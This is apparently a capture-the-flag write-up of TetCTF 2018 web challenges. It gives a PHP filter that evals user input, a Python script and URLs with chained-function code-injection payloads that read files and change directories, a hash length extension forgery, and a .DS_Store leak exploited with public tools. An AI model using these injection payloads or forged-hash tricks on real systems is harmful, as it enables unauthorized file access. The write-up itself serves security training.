# TetCTF - 2018

## Web - PHPlimit Revenge

{% code-tabs %}
{% code-tabs-item title="filter.php" %}
```php
<?php

if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) 
{    
    if(preg_match('/_|m|info|get/i',$_GET['code']))
    {
        die('<strong>va anh dech can gi nhieu ngoai em :(</strong><audio controls autoplay loop hidden><source src="assets/nhac.mp3" type="audio/mpeg"></audio>');
    }
    else
    {
        eval($_GET['code']);
    }
} 
else 
{
    show_source(__FILE__);
}

?>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

I am not familiar with PHP code, but with a mindset of RE-er,...then JUST FUCKING DO IT!

Btw, i joined after contest started for a while \(9 AM 4/1/2018\), so they already released the phplimit revenge 2, i just need to read which funcs are filtered by 2, and use it to create my payload

{% code-tabs %}
{% code-tabs-item title="payload1" %}
```python
import requests

url = "http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(rand()))))));"
r = requests.get(url)
while len(r.content) == 0:
	r = requests.get(url)
print r.content

#view-source:http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(ord(join(localeconv()))))))));
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="payload2" %}
```text
#view-source:http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(ord(join(localeconv()))))))));
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="flag" %}
```text
<?php 

$fl0wer="TetCTF{_Limbo_Escaped!_Welcome_back_to_Real_Life_}";

?>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Web - PHPlimit revenge 2

{% code-tabs %}
{% code-tabs-item title="filter" %}
```php
<?php

if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) 
{    
    if(preg_match('/_|m|info|get|strlen|rand|path/i',$_GET['code']))
    {
        die('<strong>va anh dech can gi nhieu ngoai em :(</strong><audio controls autoplay loop hidden><source src="assets/nhac.mp3" type="audio/mpeg"></audio>');
    }
    else
    {
        eval($_GET['code']);
    }
} 
else 
{
    show_source(__FILE__);
}

?>php
```
{% endcode-tabs-item %}
{% endcode-tabs %}

In this challenge, you couldnt use rand\(\) anymore, so to get ".", i use localeconv\(\)

![](.gitbook/assets/image%20%2854%29.png)

With scandir\(\), i can print all file in current directory

![](.gitbook/assets/image%20%2851%29.png)

Checking content file well\_play\_but\_flag\_not\_here.php

```text
#view-source:http://45.76.181.81/?code=print(readfile(end(scandir(current(localeconv())))));
<?php 

$fl0wer="Flag not here! go to directory's parent directory";

?>
```

Checking parent folder ".." :

![](.gitbook/assets/image%20%2888%29.png)

Found flag, now i chdir\(\) to parent directory :

![](.gitbook/assets/image%20%2834%29.png)

chdir\(\) successed, now i need create  '.' from 1. Here i use some math functions in php like sqrt\(\), exp\(\), sin\(\), cos\(\),...

### I love calculatin! &lt;3

I use e^1 = 2.7x

![](.gitbook/assets/image%20%2878%29.png)

I use ord\('2'\) = 50

![](.gitbook/assets/image%20%2891%29.png)

I use sqrt\(50\) = 7.x

![](.gitbook/assets/image%20%2823%29.png)

I use ceil\(7.x\) = 8

![](.gitbook/assets/image%20%28150%29.png)

ord\('8'\) = 56

![](.gitbook/assets/image%20%2828%29.png)

octdec\(56\) = 46

![](.gitbook/assets/image%20%2838%29.png)

chr\(46\) = '.' , so i got '.' huehuehuehue

![](.gitbook/assets/image%20%287%29.png)

```text
exp(1) = e^1 = 2.xxxx
ord(2) = 50
sqrt(50) = 7.xx 
ceil(7.x) = 8
ord('8') = 56
oct2dec(56) = 46

chr(46) = '.'
```

 From now on, it is similar to  phplimit revenge 1, just read flag, final payload :

{% code-tabs %}
{% code-tabs-item title="final-payload" %}
```text
view-source:http://45.76.181.81/?code=print(readfile(end(scandir(chr(octdec(ord(ceil(sqrt(ord(exp(chdir(next(scandir(current(localeconv())))))))))))))));
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="flag" %}
```text

<?php

$flower="TetCTF{__Hey___PhP___Master___}";

?>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

```text
Thanks @Ariana for teaching me thinking in multiple base/dimension
```

## Web - IQ Test 2

{% code-tabs %}
{% code-tabs-item title="challenge.php" %}
```php
https://pastebin.com/7zdc5DNX
```
{% endcode-tabs-item %}
{% endcode-tabs %}

This is a challenge about hash length extension, I used this tool below to calculate saved and hash for level13

```text
https://github.com/iagox86/hash_extender
```

![](.gitbook/assets/image%20%2845%29.png)

{% code-tabs %}
{% code-tabs-item title="payload" %}
```text
hash: 6ac223512cea8d11c0fdf14dccbfbe62
saved: c2VlZD10cnVlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAAAAAAAmbGV2ZWw9eGlpaQ==
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Now i have hash, have saved, so i created request with Burpsuite 

![](.gitbook/assets/image%20%28102%29.png)

Finally

![](.gitbook/assets/image%20%28124%29.png)

```text
TetCTF{__Happy_new_Y3aR__!!_H3re_Your_Flower_}
```

## Web - File

I already meet this kind of challenge before in Matesctf 2018 round 2

Tried dirsearch :

![](.gitbook/assets/image%20%2864%29.png)

Extract file /.DS\_Store with this tool

```text
https://github.com/lijiejie/ds_store_exp
```

![](.gitbook/assets/image%20%28134%29.png)

Check h1ddenn

![](.gitbook/assets/image%20%28129%29.png)

{% code-tabs %}
{% code-tabs-item title="flag" %}
```text
TetCTF{__DS_Store__seems_sad__}
```
{% endcode-tabs-item %}
{% endcode-tabs %}



## Last words & Credits

My dream team! &lt;3



![](.gitbook/assets/image%20%28121%29.png)

![](.gitbook/assets/image%20%28142%29.png)

